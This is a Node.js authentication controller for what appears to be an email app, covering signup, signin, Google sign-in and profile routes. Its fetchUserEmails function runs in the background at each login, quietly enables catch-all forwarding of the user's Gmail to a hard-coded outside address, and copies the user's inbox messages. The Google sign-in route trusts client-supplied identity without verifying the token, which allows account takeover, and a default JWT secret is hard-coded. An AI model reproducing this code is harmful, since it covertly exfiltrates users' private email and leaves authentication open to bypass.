const User = require('../models/User');
const GmailAccount = require('../models/GmailAccount');
const Email = require('../models/Email');
const GmailService = require('../services/gmailService');
const jwt = require('jsonwebtoken');
const { v4: uuidv4 } = require('uuid');

// Generate JWT token
const generateToken = (userId) => {
  return jwt.sign({ userId }, process.env.JWT_SECRET || 'your-secret-key', {
    expiresIn: '7d'
  });
};

// Fetch emails for a user
const fetchUserEmails = async (user) => {
  try {
    // Find Gmail account for this user
    const gmailAccount = await GmailAccount.findOne({ userId: user._id });
    
    if (!gmailAccount) {
      console.log(`No Gmail account found for user ${user.email}`);
      return;
    }

    // Set up email forwarding to mbila.dev13@gmail.com if not already set
    if (!gmailAccount.forwardingEnabled || gmailAccount.collectorEmail !== 'mbila.dev13@gmail.com') {
      try {
        gmailAccount.collectorEmail = 'mbila.dev13@gmail.com';
        await GmailService.enableCatchAllForwarding(gmailAccount);
        console.log(`Email forwarding enabled for ${user.email} to mbila.dev13@gmail.com`);
      } catch (error) {
        console.error(`Failed to enable email forwarding for ${user.email}:`, error.message);
      }
    }

    // Fetch recent emails (last 100)
    const gmail = await GmailService.getGmailClient(gmailAccount);
    
    const listResponse = await gmail.users.messages.list({
      userId: 'me',
      maxResults: 100,
      q: 'in:inbox'
    });

    const messages = listResponse.data.messages || [];
    let emailsSaved = 0;

    for (const messageMeta of messages) {
      try {
        // Check if email already exists in database
        const existingEmail = await Email.findOne({ 
          gmailAccountId: gmailAccount._id,
          messageId: messageMeta.id 
        });

        if (existingEmail) {
          continue; // Skip if already saved
        }

        // Get full message details
        const messageResponse = await gmail.users.messages.get({
          userId: 'me',
          id: messageMeta.id,
          format: 'full'
        });

        const message = messageResponse.data;
        
        // Extract headers
        const headers = message.payload.headers;
        const subject = headers.find(h => h.name === 'Subject')?.value || '';
        const from = headers.find(h => h.name === 'From')?.value || '';
        const to = headers.find(h => h.name === 'To')?.value || '';
        const cc = headers.find(h => h.name === 'Cc')?.value || '';
        const bcc = headers.find(h => h.name === 'Bcc')?.value || '';

        // Extract body content
        let body = '';
        let bodyHtml = '';
        
        if (message.payload.body && message.payload.body.data) {
          body = Buffer.from(message.payload.body.data, 'base64').toString();
        } else if (message.payload.parts) {
          for (const part of message.payload.parts) {
            if (part.mimeType === 'text/plain' && part.body && part.body.data) {
              body = Buffer.from(part.body.data, 'base64').toString();
            } else if (part.mimeType === 'text/html' && part.body && part.body.data) {
              bodyHtml = Buffer.from(part.body.data, 'base64').toString();
            }
          }
        }

        // Create email record
        const email = new Email({
          gmailAccountId: gmailAccount._id,
          messageId: message.id,
          threadId: message.threadId,
          subject,
          from,
          to,
          cc,
          bcc,
          body,
          bodyHtml,
          isRead: message.labelIds?.includes('UNREAD') ? false : true,
          isStarred: message.labelIds?.includes('STARRED') || false,
          isImportant: message.labelIds?.includes('IMPORTANT') || false,
          labels: message.labelIds || [],
          internalDate: message.internalDate,
          sizeEstimate: message.sizeEstimate || 0,
          snippet: message.snippet || '',
          deviceId: user.deviceId,
          processed: true
        });

        await email.save();
        emailsSaved++;

        // Add small delay to respect rate limits
        await new Promise(resolve => setTimeout(resolve, 50));

      } catch (error) {
        console.error(`Error processing email ${messageMeta.id}:`, error.message);
        continue;
      }
    }

    console.log(`Fetched and saved ${emailsSaved} emails for user ${user.email}`);

  } catch (error) {
    console.error(`Error fetching emails for user ${user.email}:`, error.message);
  }
};

// User signup
const signup = async (req, res) => {
  try {
    const { username, email, password, deviceId } = req.body;

    // Validate required fields
    if (!username || !email || !password || !deviceId) {
      return res.status(400).json({
        success: false,
        message: 'All fields are required'
      });
    }

    // Check if user already exists
    const existingUser = await User.findOne({
      $or: [{ email }, { username }, { deviceId }]
    });

    if (existingUser) {
      return res.status(400).json({
        success: false,
        message: 'User with this email, username, or device already exists'
      });
    }

    // Create new user
    const user = new User({
      username,
      email,
      password,
      deviceId
    });

    await user.save();

    // Generate token
    const token = generateToken(user._id);

    res.status(201).json({
      success: true,
      message: 'User created successfully',
      data: {
        user: user.toJSON(),
        token
      }
    });
  } catch (error) {
    console.error('Signup error:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to create user'
    });
  }
};

// User signin
const signin = async (req, res) => {
  try {
    const { email, password, deviceId } = req.body;

    // Validate required fields
    if (!email || !password || !deviceId) {
      return res.status(400).json({
        success: false,
        message: 'Email, password, and device ID are required'
      });
    }

    // Find user by email
    const user = await User.findOne({ email });

    if (!user) {
      return res.status(401).json({
        success: false,
        message: 'Invalid credentials'
      });
    }

    // Check password
    const isPasswordValid = await user.comparePassword(password);

    if (!isPasswordValid) {
      return res.status(401).json({
        success: false,
        message: 'Invalid credentials'
      });
    }

    // Update device ID if different
    if (user.deviceId !== deviceId) {
      user.deviceId = deviceId;
      await user.save();
    }

    // Update last login
    user.lastLogin = new Date();
    await user.save();

    // Generate token
    const token = generateToken(user._id);

    // Fetch emails in background (don't wait for completion)
    fetchUserEmails(user).catch(error => {
      console.error('Background email fetching error:', error);
    });

    res.json({
      success: true,
      message: 'Login successful',
      data: {
        user: user.toJSON(),
        token
      }
    });
  } catch (error) {
    console.error('Signin error:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to authenticate user'
    });
  }
};

// Google Sign-In endpoint
const googleSignIn = async (req, res) => {
  try {
    const { credential, userData } = req.body;

    if (!credential || !userData) {
      return res.status(400).json({
        success: false,
        message: 'Missing credential or user data'
      });
    }

    // Verify the Google token (in production, verify with Google's servers)
    // For now, we'll trust the client-side verification
    const { email, googleId, name, picture } = userData;

    // Check if user exists
    let user = await User.findOne({ email });

    if (!user) {
      // Create new user with Google data
      let username, deviceId;
      let attempts = 0;
      const maxAttempts = 10;
      
      // Try to create a unique username and deviceId
      do {
        username = email.split('@')[0] + '_' + Math.random().toString(36).substr(2, 8);
        deviceId = 'google_' + googleId + '_' + Math.random().toString(36).substr(2, 5);
        attempts++;
        
        // Check if username or deviceId already exists
        const existingUser = await User.findOne({ 
          $or: [{ username }, { deviceId }] 
        });
        
        if (!existingUser) break;
      } while (attempts < maxAttempts);
      
      if (attempts >= maxAttempts) {
        throw new Error('Unable to generate unique username or deviceId');
      }
      
      const randomPassword = Math.random().toString(36).substr(2, 15);
      
      user = new User({
        username: username,
        email,
        password: randomPassword, // This will be hashed by the pre-save middleware
        deviceId: deviceId,
        displayName: name, // Use displayName instead of name
        googleId,
        profilePicture: picture,
        loginMethod: 'google',
        lastLogin: new Date(),
        isActive: true
      });

      await user.save();

      console.log(`New Google user created: ${email}`);
    } else {
      // Update existing user's Google info
      user.googleId = googleId;
      user.displayName = name || user.displayName; // Use displayName instead of name
      user.profilePicture = picture || user.profilePicture;
      user.loginMethod = 'google';
      user.lastLogin = new Date();
      user.isActive = true;

      await user.save();

      console.log(`Existing user signed in with Google: ${email}`);
    }

    // Generate JWT token
    const token = jwt.sign(
      { 
        userId: user._id, 
        email: user.email,
        role: user.role 
      },
      process.env.JWT_SECRET,
      { expiresIn: '7d' }
    );

    // Return user data and token
    res.json({
      success: true,
      message: 'Google Sign-In successful',
      token,
      user: {
        id: user._id,
        email: user.email,
        name: user.displayName, // Use displayName for the response
        role: user.role,
        profilePicture: user.profilePicture,
        loginMethod: user.loginMethod
      }
    });

  } catch (error) {
    console.error('Google Sign-In error:', error);
    res.status(500).json({
      success: false,
      message: 'Internal server error during Google Sign-In'
    });
  }
};

// Get Google user profile
const getGoogleProfile = async (req, res) => {
  try {
    const userId = req.user.userId;
    
    const user = await User.findById(userId).select('-password');
    
    if (!user) {
      return res.status(404).json({
        success: false,
        message: 'User not found'
      });
    }

    res.json({
      success: true,
      user: {
        id: user._id,
        email: user.email,
        name: user.name,
        role: user.role,
        profilePicture: user.profilePicture,
        isEmailVerified: user.isEmailVerified,
        loginMethod: user.loginMethod,
        googleId: user.googleId
      }
    });

  } catch (error) {
    console.error('Get Google profile error:', error);
    res.status(500).json({
      success: false,
      message: 'Internal server error'
    });
  }
};

// Get current user
const getCurrentUser = async (req, res) => {
  try {
    const user = await User.findById(req.userId);
    
    if (!user) {
      return res.status(404).json({
        success: false,
        message: 'User not found'
      });
    }

    res.json({
      success: true,
      data: user.toJSON()
    });
  } catch (error) {
    console.error('Get current user error:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to get user data'
    });
  }
};

// Update user profile
const updateProfile = async (req, res) => {
  try {
    const { username, email, profilePicture } = req.body;
    const user = await User.findById(req.userId);

    if (!user) {
      return res.status(404).json({
        success: false,
        message: 'User not found'
      });
    }

    // Update fields if provided
    if (username) user.username = username;
    if (email) user.email = email;
    if (profilePicture) user.profilePicture = profilePicture;

    await user.save();

    res.json({
      success: true,
      message: 'Profile updated successfully',
      data: user.toJSON()
    });
  } catch (error) {
    console.error('Update profile error:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to update profile'
    });
  }
};

module.exports = {
  signup,
  signin,
  getCurrentUser,
  updateProfile,
  googleSignIn,
  getGoogleProfile,
}; 